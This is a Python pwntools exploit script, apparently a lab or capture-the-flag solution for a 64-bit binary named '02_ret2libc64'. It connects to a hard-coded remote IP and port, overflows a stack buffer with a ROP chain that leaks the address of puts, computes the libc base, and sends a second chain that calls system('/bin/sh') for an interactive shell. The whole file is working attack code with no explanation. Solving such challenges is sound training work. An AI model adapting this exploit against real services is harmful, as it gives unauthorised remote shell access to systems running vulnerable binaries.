from pwn import *
context.log_level = 'DEBUG'

local = False
elf = ELF('./02_ret2libc64')

if local:
    p = elf.process()
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote("47.99.80.189", 10012)
    libc = ELF('libc-2.27.so')
    p.recvuntil('ID:')
    p.sendline('3180103650')

raw_input()

p.recvuntil('ID:')
p.sendline('3180103650')

puts_plt = 0x400550
puts_got = 0x601018
pop_rdi = 0x0000000000400843
ret = 0x000000000040053e
hear = 0x400706

rop_chain1 = [
    ret,
    pop_rdi,
    puts_got,
    puts_plt,
    hear
]
rop_chain1 = ''.join(p64(i) for i in rop_chain1)

payload1 = '\x90'*(256+8) + rop_chain1

#raw_input()

p.recvuntil('me!')
p.sendline(payload1)
sleep(1)
p.recvuntil('\n')
puts = u64(p.recv(6).ljust(8, '\x00'))
print(hex(puts))

p.clean()

print('puts libc', hex(libc.symbols['puts']))

libc.address = puts - libc.symbols['puts']

system = libc.symbols['system']

print('system', system, p64(system))


bin_sh = libc.search('/bin/sh').next()
print('bin_sh', bin_sh, p64(bin_sh))

print('pop_rdi', pop_rdi, p64(pop_rdi))

rop_chain2 = [
    pop_rdi,
    bin_sh,
    system
]

rop_chain2 = ''.join([ p64(i) for i in rop_chain2])

print('rop_chain2', rop_chain2)

payload2 = 'A'*(256+8) + rop_chain2

p.sendline(payload2)
p.interactive()


